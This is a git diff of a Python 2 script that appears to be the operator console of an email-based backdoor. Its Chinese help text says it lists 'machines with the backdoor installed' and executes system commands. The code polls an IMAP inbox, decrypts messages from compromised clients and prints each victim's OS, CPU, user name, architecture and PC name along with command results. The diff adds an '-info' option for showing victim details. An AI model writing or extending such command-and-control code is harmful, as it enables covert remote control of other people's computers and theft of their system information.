@@ -77,7 +77,7 @@ class MessageParser:
 		payload = email.message_from_string(msg_data[1][0][1]).get_payload(None,True)
 		data = being_secure.decrypt((payload))
 
-		self.infodict =json.loads(json.loads(data))
+		self.infodict =json.loads(data)
 
 	def getSubjectHeader(self,msg_data):
 		self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
@@ -136,16 +136,19 @@ class Siboer:
 			sys.exit("你必须输入clientid ")
 
 		self.r.select('inbox')
-		rcode,idlist = self.r.search(None,'(SUBJECT "Client:{}")'.format(clientid))
+		rcode,idlist = self.r.search(None,'(SUBJECT "This:{}")'.format(clientid))
+		print idlist
 		for idm in idlist[0].split():
 			data = self.r.fetch(idm,'(RFC822)')
-			msg = MessageParser(data)
+			msgs = MessageParser(data)
 
 			print "ClientID: " + str(clientid)
-			print "Date: '{}'".format(msg.date)
-			#print "PID: " + str(msg.infodict['pid'])
-		#	print "OS: " + str(msg.infodict['os'])
-
+			print "Date: '{}'".format(msgs.date)
+			print "OS: " + msgs.infodict['os']
+			print "CPU: " + msgs.infodict['CPU']
+			print "User: " + msgs.infodict['user']
+			print "architecture: " + msgs.infodict['arc']
+			print "PCname: " + msgs.infodict['PCname']
 
 	def getJobresults(self,clientid,jobid):
 		if clientid is None or jobid is None:
@@ -156,12 +159,13 @@ class Siboer:
 		print idlist
 		for idm in idlist[0].split():
 			data = self.r.fetch(idm,'(RFC822)')
-			msg = MessageParser(data)
+			msgs = MessageParser(data)
+
 			print "CLientID: " + str(clientid)
 			print "JobID: " + str(jobid)
-			print "CMD: {} ".format(msg.infodict["cmd"])
+			print "CMD: {} ".format(msgs.infodict['msg']["cmd"])
 			print "-----"
-			print msg.infodict['result'].encode('utf-8')
+			print msgs.infodict['msg']['result'].encode('utf-8')
 
 
 	def logout(self):
@@ -179,6 +183,7 @@ if __name__ == "__main__":
     parser.add_argument('-jobid',dest='jobid',type=str,default=None,help='get results')
 
     parser.add_argument('-list',dest='list',action='store_true',help="列出放入后门的机器")
+    parser.add_argument('-info',dest='info',action='store_true',help="列出client信息")
     parser.add_argument('-cmd',dest='cmd',type=str,help="执行一条系统命令")
 
 
@@ -193,6 +198,9 @@ if __name__ == "__main__":
 
     if args.list:
     	sibo.checkclients()
+
+    if args.info:
+    	sibo.getclientInfo(args.id)
 
     elif args.cmd:
     	sibo.send_email(args.id,jobid,'execCMD',args.cmd)
